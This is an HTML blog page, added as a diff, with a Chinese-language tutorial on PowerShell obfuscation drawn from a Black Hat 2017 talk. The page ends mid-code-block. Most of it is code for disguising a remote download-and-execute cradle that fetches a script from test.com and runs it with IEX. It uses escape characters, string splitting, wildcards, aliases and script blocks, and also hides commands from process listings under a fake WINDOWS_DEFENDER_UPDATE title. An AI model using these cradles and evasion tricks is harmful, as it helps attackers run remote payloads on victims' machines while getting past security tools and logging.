@@ -1,0 +1,971 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>[译] Powershell-Evasion - Evi1oX</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="Evi1oX" /><meta name="description" content="From 感谢rootclay和七三的翻译 原文地址：https://www.blackhat.com/docs/us-17/thursday/us-" /><meta name="keywords" content="Hugo, theme, even" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.54.0 with theme even" />
+
+
+<link rel="canonical" href="https://04z.net/post/powershell-evasion/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+<link href="/dist/even.983f84a7.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="[译] Powershell-Evasion" />
+<meta property="og:description" content="From 感谢rootclay和七三的翻译 原文地址：https://www.blackhat.com/docs/us-17/thursday/us-" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://04z.net/post/powershell-evasion/" />
+<meta property="article:published_time" content="2017-12-12T19:46:48&#43;00:00"/>
+<meta property="article:modified_time" content="2017-12-12T19:46:48&#43;00:00"/>
+
+<meta itemprop="name" content="[译] Powershell-Evasion">
+<meta itemprop="description" content="From 感谢rootclay和七三的翻译 原文地址：https://www.blackhat.com/docs/us-17/thursday/us-">
+
+
+<meta itemprop="datePublished" content="2017-12-12T19:46:48&#43;00:00" />
+<meta itemprop="dateModified" content="2017-12-12T19:46:48&#43;00:00" />
+<meta itemprop="wordCount" content="3790">
+
+
+
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="[译] Powershell-Evasion"/>
+<meta name="twitter:description" content="From 感谢rootclay和七三的翻译 原文地址：https://www.blackhat.com/docs/us-17/thursday/us-"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Evi1oX</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/post/friends">
+        <li class="mobile-menu-item">Friends</li>
+      </a>
+  </ul>
+</nav>
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">Evi1oX</a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/post/friends">Friends</a>
+      </li>
+  </ul>
+</nav>
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">[译] Powershell-Evasion</h1>
+
+      <div class="post-meta">
+        
+        
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+<ul>
+<li><a href="#0x01-第一章">0x01 <em>第一章</em></a></li>
+<li><a href="#0x02-第二章">0x02 <em>第二章</em></a>
+<ul>
+<li><a href="#1-cmd启动powershell">1. cmd启动powershell</a></li>
+<li><a href="#2-混淆">2. 混淆</a></li>
+<li><a href="#3-iex-的处理与其他执行方法">3. IEX 的处理与其他执行方法</a></li>
+<li><a href="#4-相关工具">4. 相关工具</a></li>
+</ul></li>
+</ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      
+
+<p>From 感谢<code>rootclay</code>和<code>七三</code>的翻译</p>
+
+<p>原文地址：<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Bohannon-Revoke-Obfuscation-PowerShell-Obfuscation-Detection-And%20Evasion-Using-Science.pdf">https://www.blackhat.com/docs/us-17/thursday/us-17-Bohannon-Revoke-Obfuscation-PowerShell-Obfuscation-Detection-And%20Evasion-Using-Science.pdf</a></p>
+
+<h1 id="0x01-第一章">0x01 <em>第一章</em></h1>
+
+<p>即使powershell越来越火,但是执行的某些字符遭到waf或者防火墙拦截本来无法避免.本篇文章从各大国内外摘录了很多知识点.包括blackhat2017等.为了防止被拦截,通常可以进行混淆处理,例如 Base64，在执行代码之前很难发现或确认这些代码实际上会做些什么事情。由于脚本块日志会在实际的代码传递到 PowerShell 引擎之前进行记录，这就使得在代码执行之前就能进行日志记录，因为脚本代码在执行之前需要进行反混淆处理.<br />
+现在最为常见的处理方式是<code>Base64，Base64 + XOR</code></p>
+
+<p>Microsoft 提供了一个经过混淆处理的命令代码示例：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">## Malware
+function SuperDecrypt
+{
+param($script)
+$bytes = [Convert]::FromBase64String($script)
+## XOR &#34;encryption&#34;
+$xorKey = 0x42
+for($counter = 0; $counter -lt   $bytes.Length; $counter++)
+{
+$bytes[$counter] = $bytes[$counter] -bxor $xorKey
+}
+[System.Text.Encoding]::Unicode.GetString($bytes)
+}
+$decrypted = SuperDecrypt &#34;FUIwQitCNkInQm9CCkItQjFCNkJiQmVCEkI1QixCJkJlQg==&#34;
+Invoke-Expression $decrypted</pre></td></tr></table>
+</div>
+</div>
+<p>传递给 PowerShell 处理的原始的脚本块内容 （如上文所述）就是 PowerShell 执行的实际命令。<br />
+请注意，脚本块记录默认是启用的。</p>
+
+<p><strong>实例</strong></p>
+
+<p>在混淆之前，先看看powershell编码执行的方式。<br />
+<code>-EC,-EncodedCommand,-EncodedComman,-EncodedComma,-EncodedComm,......,Enc,-En,E</code><br />
+那么这些参数都可以让代码编码执行，可见我们的混淆的选择是非常多的，而防御起来就越难。<br />
+我们在攻击时经常会远程下载代码脚本执行，这里基于这样的一条标准的下载文件命令来进行变形混淆。<br />
+<code>Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;http://test.com/powershell&quot;)</code><br />
+简单处理我们刚才的命令：<br />
+<code>Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;http://test.com/powershell&quot;)</code><br />
+<strong>去掉System关键字</strong><br />
+<code>Invoke-Expression (New-Object Net.WebClient).DownloadString(&quot;http://test.com/powershell&quot;)</code><br />
+<strong>使用字符串连接+号连接</strong><br />
+<code>Invoke-Expression (New-Object Net.WebClient).DownloadString(&quot;ht&quot;+&quot;tp://test.com/powershell&quot;)</code><br />
+<strong>使用Invoke方法</strong><br />
+<code>Invoke-Expression (New-Object Net.WebClient).(&quot;DownloadString&quot;).Invoke('h'+'ttp://test.com/powershell') $ds=&quot;Down&quot;+&quot;loadString&quot;;Invoke-Expression (New-Object Net.WebClient).$ds.Invoke('h'+'ttp://test.com/powershell')</code><br />
+<strong>变量替代</strong><br />
+<code>IEX $test=New-Object Net.WebClient;$test.DownloadString('h'+'ttp://test.com/powershell')</code><br />
+<strong>关键字使用单双引号引起来</strong></p>
+
+<p><code>Invoke-Expression (New-Object Net.WebClient).&quot;DownloadString&quot;('h'+'ttp://test.com/powershell')</code><br />
+<strong>转义符号</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">Invoke-Expression (New-Object Net.WebClient).&#34;D`o`wn`l`oad`Str`in`g&#34;(&#39;h&#39;+&#39;ttp://test.com/power&#39;)</pre></td></tr></table>
+</div>
+</div>
+<p><strong>字符串反转</strong><br />
+<code>$re= &quot;)'1/1.0.0.721//:ptth'(gnirtSdaolnwoD.)tneilCbeW.teN tcejbO-weN(&quot;;
+IEX ($re[-1..-($re.Length)] -Join '') | IEX</code><br />
+编码执行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">$command = &#34;Write-Host &#39;Hello World!&#39;&#34;
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+$encodedCommand = [Convert]::ToBase64String($bytes)
+powershell.exe -EncodedCommand $encodedCommand
+IEX</pre></td></tr></table>
+</div>
+</div>
+<p>我们使用的代码很多都使用Invoke-Expression/IEX命令， Invoke-Expression/IEX命令是很常用的一个命令， 运行一个以字符串形式提供的PowerShell表达式。 这里也先看看代替IEX的各种执行方式<br />
+<code>&amp;(GAL I*X)</code> : 通过别名的方式来进行编码<br />
+<code>Command I*e-E*</code>: 通过command的方式来进行编码<br />
+<code>$ExecutionContext.InvokeCommand.GetCmdlets('I*e-E*')</code>使用环境变量等等&hellip;</p>
+
+<h1 id="0x02-第二章">0x02 <em>第二章</em></h1>
+
+<h2 id="1-cmd启动powershell">1. cmd启动powershell</h2>
+
+<p>首先看看powershel使用cmd.exe启动执行代码的方式：</p>
+
+<p><strong>1.1 常规方法</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">cmd.exe /c &#34;powershell -c Write-Host SUCCESS -Fore Green&#34;
+cmd.exe /c &#34;echo Write-Host SUCCESS -Fore Green | powershell -&#34;
+cmd /c &#34;set p1=power&amp;&amp; set p2=shell&amp;&amp; cmd /c echo Write-Host SUCCESS -Fore Green ^|%p1%%p2% -&#34;</pre></td></tr></table>
+</div>
+</div>
+<p><strong>1.2 管道输入流</strong><br />
+<code>cmd.exe /c &quot;echo Write-Host SUCCESS -Fore Green | powershell IEX $input&quot;</code></p>
+
+<p><strong>1.3 利用环境变量</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">cmd.exe /c &#34;set cmd=Write-Host ENV -Fore Green&amp;&amp;powershell IEX $env:cmd&#34;
+cmd.exe /c &#34;set cmd=Write-Host ENV -Fore Green&amp;&amp;cmd /c echo %cmd%|powershell -
+cmd.exe /c &#34;set cmd=Write-Host ENV -Fore Green&amp;&amp;powershell IEX ([Environment]::GetEnvironmentVariable(&#39;cmd&#39;, &#39;Process&#39;))
+cmd.exe /c &#34;set cmd=Write-Host ENV -Fore Green&amp;&amp;powershell IEX ((Get-ChildItem/ChildItem/GCI/DIR/LS env:cmd).Value)</pre></td></tr></table>
+</div>
+</div>
+<p>在父进程中隐藏运行的代码：上面第二种方式运行时，如果使用进程查看，可以在父进程启动参数中<code>cmd.exe /c &quot;set cmd=Write-Host ENV -Fore Green&amp;&amp;cmd /c echo %cmd%|powershell -</code>,看到你执行的代码，因为此时powershell -的父进程时第一个cmd.exe，所以可以使用cmd中的转义符号^将|转义后，如</p>
+
+<p><code>cmd.exe /c &quot;set cmd=Write-Host ENV -Fore Green&amp;&amp;cmd /c echo %cmd%^|powershell -</code>,第二个cmd后面对命令行来说是一个整体，然后执行<code>cmd /c echo %cmd%|powershell -</code>,此时powershell -的父进程就是第二个cmd了，看不到我们执行的代码了。</p>
+
+<p><strong>1.4 从其他进程获取参数</strong></p>
+
+<p>首先启动多个cmd进程，这些进程参数中包含要执行的代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">cmd /c &#34;title WINDOWS_DEFENDER_UPDATE&amp;&amp;echo IEX (IWR https://test.com/power)&amp;&amp; FOR /L %i IN (1,1,1000) DO echo&#34;</pre></td></tr></table>
+</div>
+</div>
+<p>然后在powershell中提取出来<code>IEX (IWR https://test.com/power)</code>执行，如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">cmd /c &#34;powershell IEX (Get-WmiObject Win32_Process -Filter ^&#34;Name = &#39;cmd.exe&#39; AND CommandLine like &#39;%WINDOWS_DEFENDER_UPDATE%&#39;^&#34;).CommandLine.Split([char]38)[2].SubString(5)&#34;</pre></td></tr></table>
+</div>
+</div>
+<p><strong>1.5 从粘贴板</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">cmd.exe /c &#34;echo Write-Host CLIP -Fore Green | clip&amp;&amp; powershell [void][System.Reflection.Assembly]::LoadWithPartialName(&#39;System.Windows.Forms&#39;); IEX ([System.Windows.Forms.Clipboard]::GetText())&#34;</pre></td></tr></table>
+</div>
+</div>
+<p>这些方法可以在powershell日志中看到，所以开启powershell的日志分析很重要。</p>
+
+<p>但是，如果时混淆的，日志中也仅仅是记录了混淆后的东西。</p>
+
+<h2 id="2-混淆">2. 混淆</h2>
+
+<p>Hacker在攻击时经常会远程下载代码脚本执行，这里基于这样的一条标准的下载文件命令来进行变形混淆。</p>
+
+<p><code>Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;http://test.com/power&quot;)</code><br />
+在混淆之前，先看看powershell获取环境变量的方式。</p>
+
+<p><code>Get-Variable/GV/Variable cmd -ValueOnly
+-ValueOnly</code>可以简写为<code>-ValueOnly,-ValueOnl,-ValueOn,-ValueO……,-Va,-V</code></p>
+
+<p><code>(Get-Item/GI/Item Variable:cmd).Value</code><br />
+<code>(Get-ChildItem/GCI/ChildItem/DIR/LS Variable:cmd).Value</code></p>
+
+<p>后面很多构造会用到这些方式的。</p>
+
+<p><strong>2.0 简单处理</strong></p>
+
+<p><code>Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;http://test.com/power&quot;)</code><br />
+<strong>可以去掉System</strong></p>
+
+<p><code>Invoke-Expression (New-Object Net.WebClient).DownloadString(&quot;http://test.com/power&quot;)</code><br />
+<strong>将http分开+号连接</strong></p>
+
+<p><code>Invoke-Expression (New-Object Net.WebClient).DownloadString(&quot;ht&quot;+&quot;tp://test.com/power&quot;)</code><br />
+<strong>变量代替</strong></p>
+
+<p><code>IEX $wc=New-Object Net.WebClient;$wc.DownloadString('h'+'ttp://test.com/power')</code><br />
+把<code>downloadstring</code>使用单双引号引起来</p>
+
+<p><code>Invoke-Expression (New-Object Net.WebClient).&quot;DownloadString&quot;('h'+'ttp://test.com/power')</code><br />
+<strong>使用invoke方法</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">Invoke-Expression (New-Object Net.WebClient).(&#34;DownloadString&#34;).Invoke(&#39;h&#39;+&#39;ttp://test.com/power&#39;)
+$ds=&#34;Down&#34;+&#34;loadString&#34;;Invoke-Expression (New-Object Net.WebClient).$ds.Invoke(&#39;h&#39;+&#39;ttp://test.com/power&#39;)</pre></td></tr></table>
+</div>
+</div>
+<p>以上单双引号可以切换</p>
+
+<p><strong>2.1 转义符(反引号)</strong></p>
+
+<p>查看帮助Get-Help about_Escape_Characters</p>
+
+<p>以下为 Windows PowerShell 能够识别的特殊字符：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">    0     Null
+    `a    警报
+    `b    退格
+    `f    换页
+    `n    换行
+    `r    回车
+    `t    水平制表
+    `v    垂直制表</pre></td></tr></table>
+</div>
+</div>
+<p>转义符号加在其他字符前不影响字符的意思，避免在<code>0,a,b,f,n,r,t,v</code>的小写字母前出现即可。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">Invoke-Expression (New-Object Net.WebClient).&#34;Down`loadString&#34;(&#39;h&#39;+&#39;ttp://test.com/power&#39;)
+Invoke-Expression (New-Object Net.WebClient).&#34;D`o`wn`l`oad`Str`in`g&#34;(&#39;h&#39;+&#39;ttp://test.com/power&#39;)
+Invoke-Expression (New-Object Net.WebClient).&#34;D`o`w`N`l`o`A`d`S`T`R`in`g&#34;(&#39;h&#39;+&#39;ttp://test.com/power&#39;)</pre></td></tr></table>
+</div>
+</div>
+<p>同样可以使用在 <strong>Net.Webclient</strong>上</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">Invoke-Expression (New-Object &#34;`Ne`T.`Web`Cli`ent&#34;).&#34;Down`l`oadString&#34;(&#39;h&#39;+&#39;ttp://test.com/power&#39;)</pre></td></tr></table>
+</div>
+</div>
+<p>括号代替空格，或者多个定义变量来连接替换</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">Invoke-Expression (New-Object(&#34;`Ne`T.`Web`Cli`ent&#34;)).&#34;Down`l`oadString&#34;(&#39;h&#39;+&#39;ttp://test.com/power&#39;)
+$v1=&#34;Net.&#34;;$v2=&#34;WebClient&#34;;Invoke-Expression (New-Object $v1$v2).&#34;Down`l`oadString&#34;(&#39;h&#39;+&#39;ttp://test.com/power&#39;)</pre></td></tr></table>
+</div>
+</div>
+<p><strong>2.2 简写与通配符</strong></p>
+
+<p>e.g <code>Get-Comamd New-Ob*</code></p>
+
+<p>以下几种处理都可以代替 <code>Get-Command New-Object ; Get-Comamnd</code> 可简写为 <code>GCM</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">&amp;(Get-Command New-Obje*)     &amp;(Get-Command *w-O*)     &amp;(GCM *w-O*)     &amp;(COMMAND *w-*ct)
+.(Get-Command New-Obje*)     .(Get-Command *w-O*)     .(GCM *w-O*)     .(COMMAND *w-*ct)
+$var1=&#34;New&#34;;$var2=&#34;-Object&#34;;$var3=$var1+$var2;&amp;(GCM $var3)</pre></td></tr></table>
+</div>
+</div>
+<p>结合其他方法混淆</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Invoke-Expression</span> <span class="p">(&amp;(</span><span class="nb">Get-Command</span> <span class="nb">New-Obje</span><span class="p">*)</span><span class="s2">&#34;Net.WebClient&#34;</span><span class="p">).</span><span class="s2">&#34;DownloadString&#34;</span><span class="p">(</span><span class="s1">&#39;h&#39;</span><span class="p">+</span><span class="s1">&#39;ttp://test.com/power&#39;</span><span class="p">)</span>
+<span class="nv">$var1</span><span class="p">=</span><span class="s2">&#34;New&#34;</span><span class="p">;</span><span class="nv">$var2</span><span class="p">=</span><span class="s2">&#34;-Object&#34;</span><span class="p">;</span><span class="nv">$var3</span><span class="p">=</span><span class="nv">$var1</span><span class="p">+</span><span class="nv">$var2</span><span class="p">;</span><span class="nb">Invoke-Expression</span> <span class="p">(&amp;(</span><span class="n">GCM</span> <span class="nv">$var3</span><span class="p">)</span><span class="s2">&#34;Net.WebClient&#34;</span><span class="p">).</span><span class="s2">&#34;DownloadString&#34;</span><span class="p">(</span><span class="s1">&#39;h&#39;</span><span class="p">+</span><span class="s1">&#39;ttp://test.com/power&#39;</span><span class="p">)</span>
+<span class="n">ie</span><span class="p">`</span><span class="n">x</span> <span class="p">(.(</span><span class="n">GCM</span> <span class="p">*</span><span class="n">w-O</span><span class="p">*)</span><span class="s2">&#34;Net.WebClient&#34;</span><span class="p">).</span><span class="s2">&#34;DownloadString&#34;</span><span class="p">(</span><span class="s1">&#39;h&#39;</span><span class="p">+</span><span class="s1">&#39;ttp://test.com/power&#39;</span><span class="p">)</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><strong>2.3 脚本块</strong></p>
+
+<p><strong>使用脚本块</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">invoke-command</span><span class="p">{</span><span class="n">xxxx</span><span class="p">}</span>   <span class="n">ICM</span><span class="p">{</span><span class="n">xxxx</span><span class="p">}</span>   <span class="p">{</span><span class="n">xxxx</span><span class="p">}.</span><span class="n">invoke</span><span class="p">()</span>    <span class="p">&amp;{</span><span class="n">xxxx</span><span class="p">}</span>    <span class="p">.{</span><span class="n">xxxx</span><span class="p">}</span>
+<span class="nv">$ExecutionContext</span><span class="p">.</span><span class="n">InvokeCommand</span><span class="p">.</span><span class="n">NewScriptBlock</span><span class="p">(</span><span class="s2">&#34;xxxxx&#34;</span><span class="p">)</span>
+<span class="p">${</span><span class="n">ExecuTioNCoNTexT</span><span class="p">}.</span><span class="s2">&#34;INVokeCommANd&#34;</span><span class="p">.</span><span class="s2">&#34;NewScRipTBlock&#34;</span><span class="p">(</span><span class="s2">&#34;expression&#34;</span><span class="p">)</span>
+<span class="nv">$ExecutionContext</span><span class="p">.</span><span class="s2">&#34;`I</span><span class="se">`N`V</span><span class="s2">`o`k`e`C`o`m`m</span><span class="se">`A`N</span><span class="s2">`d&#34;</span><span class="p">.</span><span class="s2">&#34;</span><span class="se">`N</span><span class="s2">`e`w`S`c</span><span class="se">`R</span><span class="s2">`i`p</span><span class="se">`T`B</span><span class="s2">`l`o`c`k&#34;</span><span class="p">(</span><span class="s2">&#34;expression&#34;</span><span class="p">)</span>
+<span class="p">${`</span><span class="n">E</span><span class="p">`</span><span class="n">x</span><span class="p">`</span><span class="n">e</span><span class="p">`</span><span class="n">c</span><span class="p">`</span><span class="n">u</span><span class="p">`</span><span class="n">T</span><span class="p">`</span><span class="n">i</span><span class="p">`</span><span class="n">o</span><span class="p">`</span><span class="n">N</span><span class="p">`</span><span class="n">C</span><span class="p">`</span><span class="n">o</span><span class="p">`</span><span class="n">N</span><span class="p">`</span><span class="n">T</span><span class="p">`</span><span class="n">e</span><span class="p">`</span><span class="n">x</span><span class="p">`</span><span class="n">T</span><span class="p">}.</span><span class="s2">&#34;`I</span><span class="se">`N`V</span><span class="s2">`o`k`e`C`o`m`m</span><span class="se">`A`N</span><span class="s2">`d&#34;</span><span class="p">.</span><span class="s2">&#34;</span><span class="se">`N</span><span class="s2">`e`w`S`c</span><span class="se">`R</span><span class="s2">`i`p</span><span class="se">`T`B</span><span class="s2">`l`o`c`k&#34;</span><span class="p">(</span><span class="s2">&#34;expression&#34;</span><span class="p">)</span>
+<span class="nv">$a</span> <span class="p">=</span> <span class="p">${`</span><span class="n">E</span><span class="p">`</span><span class="n">x</span><span class="p">`</span><span class="n">e</span><span class="p">`</span><span class="n">c</span><span class="p">`</span><span class="n">u</span><span class="p">`</span><span class="n">T</span><span class="p">`</span><span class="n">i</span><span class="p">`</span><span class="n">o</span><span class="p">`</span><span class="n">N</span><span class="p">`</span><span class="n">C</span><span class="p">`</span><span class="n">o</span><span class="p">`</span><span class="n">N</span><span class="p">`</span><span class="n">T</span><span class="p">`</span><span class="n">e</span><span class="p">`</span><span class="n">x</span><span class="p">`</span><span class="n">T</span><span class="p">};</span> <span class="nv">$b</span> <span class="p">=</span> <span class="nv">$a</span><span class="p">.</span><span class="s2">&#34;`I</span><span class="se">`N`V</span><span class="s2">`o`k`e`C`o`m`m</span><span class="se">`A`N</span><span class="s2">`d&#34;</span><span class="p">;</span><span class="nv">$b</span><span class="p">.</span><span class="s2">&#34;</span><span class="se">`N</span><span class="s2">`e`w`S`c</span><span class="se">`R</span><span class="s2">`i`p</span><span class="se">`T`B</span><span class="s2">`l`o`c`k&#34;</span><span class="p">(</span><span class="s2">&#34;ex&#34;</span><span class="p">+</span><span class="s2">&#34;pres&#34;</span><span class="p">+</span><span class="s2">&#34;sion&#34;</span><span class="p">)</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><strong>Scriptblock</strong>类方法,<code>[Scriptblock]</code>相当于<code>[Type](&quot;Scriptblock&quot;)</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="no">[Scriptblock]</span><span class="p">::</span><span class="n">Create</span><span class="p">(</span><span class="s2">&#34;expression&#34;</span><span class="p">)</span>
+<span class="p">(</span><span class="no">[Type]</span><span class="s2">&#34;Scriptblock&#34;</span><span class="p">)::</span><span class="n">create</span><span class="p">(</span><span class="s1">&#39;expression&#39;</span><span class="p">)</span>
+<span class="no">[Scriptblock]</span><span class="p">::(</span><span class="s2">&#34;Create&#34;</span><span class="p">).</span><span class="n">Invoke</span><span class="p">(</span><span class="s2">&#34;expression&#34;</span><span class="p">)</span>
+<span class="p">(</span><span class="no">[Type]</span><span class="p">(</span><span class="s2">&#34;Scriptblock&#34;</span><span class="p">))::(</span><span class="s2">&#34;Create&#34;</span><span class="p">).</span><span class="n">Invoke</span><span class="p">(</span><span class="s2">&#34;expression&#34;</span><span class="p">)</span>
+<span class="no">[Scriptblock]</span><span class="p">::(</span><span class="s2">&#34;`C</span><span class="se">`R</span><span class="s2">`e&#34;</span><span class="p">+</span><span class="s2">&#34;</span><span class="se">`A`T</span><span class="s2">`e&#34;</span><span class="p">).</span><span class="n">Invoke</span><span class="p">(</span><span class="s2">&#34;expression&#34;</span><span class="p">)</span>
+<span class="p">(</span><span class="no">[Type]</span><span class="p">(</span><span class="s2">&#34;Scr&#34;</span><span class="p">+</span><span class="s2">&#34;ipt&#34;</span><span class="p">+</span><span class="s2">&#34;block&#34;</span><span class="p">))::(</span><span class="s2">&#34;`C</span><span class="se">`R</span><span class="s2">`e&#34;</span><span class="p">+</span><span class="s2">&#34;</span><span class="se">`A`T</span><span class="s2">`e&#34;</span><span class="p">).</span><span class="n">Invoke</span><span class="p">(</span><span class="s2">&#34;ex&#34;</span><span class="p">+</span><span class="s2">&#34;pres&#34;</span><span class="p">+</span><span class="s2">&#34;sion&#34;</span><span class="p">)</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><strong>混淆</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
